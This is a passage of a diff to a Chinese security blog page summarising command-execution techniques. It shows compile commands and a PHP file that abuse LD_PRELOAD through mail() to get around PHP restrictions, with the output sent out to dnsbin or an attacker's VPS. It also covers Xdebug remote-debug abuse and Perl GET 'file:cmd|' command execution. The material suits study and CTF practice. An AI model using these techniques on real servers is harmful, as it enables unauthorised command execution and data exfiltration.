+<p>当这个共享库中的geteuid被调用时，会加载payload()函数，从而实现执行命令。本地把它编译为一个位置信息无关的动态共享库：</p>
+<blockquote>
+<p>$ gcc -c -fPIC shell.c -o shell<br>$ gcc -shared shell -o shell.so  </p>
+</blockquote>
+<p>写一个简单的利用文件1.php：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">putenv(&quot;LD_PRELOAD=./shell.so&quot;);</div><div class="line">mail(&quot;root@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>将生成的shell.so及1.php上传到目标服务器，浏览器访问1.php，在dnsbin（可换成自己的vps）上可接收到whoami执行后的结果<br><a href="https://www.z4a.net/image/YNQFw" target="_blank" rel="external"><img src="https://www.z4a.net/images/2018/01/31/te.png" alt="te.png"></a></p>
+<p>该方法的前提是能够上传文件</p>
+<p>####xdebug<br>Xdebug 是一个 PHP 的调试工具，支持在本地通过源码远程调试服务器上的 PHP 代码，当xdebug.remote_connect_back选项为1时，可以进行远程调试，从而执行任意php函数,详情利用方式可见rr师傅博客：<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="external">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></p>
+<h3 id="perl命令执行"><a href="#perl命令执行" class="headerlink" title="perl命令执行"></a>perl命令执行</h3><p>perl中的open函数可以执行命令，在ctf的linux命令执行中可能会遇到<br>用法如下：</p>
+<blockquote>
+<p>创建一个类似格式为’命令|’的文件，再使用 <code>GET &#39;file:命令|&#39;</code>即可执行该命令，需要注意的是GET命令不是linux自带命令，而是存在于libwww-perl中，apt可安装</p>
+</blockquote>
+<p>之所以使用GET命令可以命令执行，是因为GET函数底层调用了open函数</p>
 
       
     </div>
@@ -455,15 +584,15 @@ border-left-color: #A349A4; /*左边框颜色*/
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/03/23/command-execute.html" rel="next" title="各种命令执行总结">
-                <i class="fa fa-chevron-left"></i> 各种命令执行总结
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/29/typecho-deserialization.html" rel="prev" title="typecho反序列化漏洞复现">
+                typecho反序列化漏洞复现 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -605,7 +734,7 @@ border-left-color: #A349A4; /*左边框颜色*/
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#typecho反序列化漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">typecho反序列化漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0X00-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0X00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-漏洞版本"><span class="nav-number">1.2.</span> <span class="nav-text">0X01. 漏洞版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-漏洞分析"><span class="nav-number">1.3.</span> <span class="nav-text">0X02 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X03-Payload"><span class="nav-number">1.4.</span> <span class="nav-text">0X03 Payload</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#各种命令执行总结"><span class="nav-number">1.</span> <span class="nav-text">各种命令执行总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-linux命令执行"><span class="nav-number">1.0.1.</span> <span class="nav-text">0X01 linux命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-常用shell反弹"><span class="nav-number">1.0.2.</span> <span class="nav-text">0X02 常用shell反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X04-PHP命令执行"><span class="nav-number">1.0.3.</span> <span class="nav-text">0X04 PHP命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl命令执行"><span class="nav-number">1.0.4.</span> <span class="nav-text">perl命令执行</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
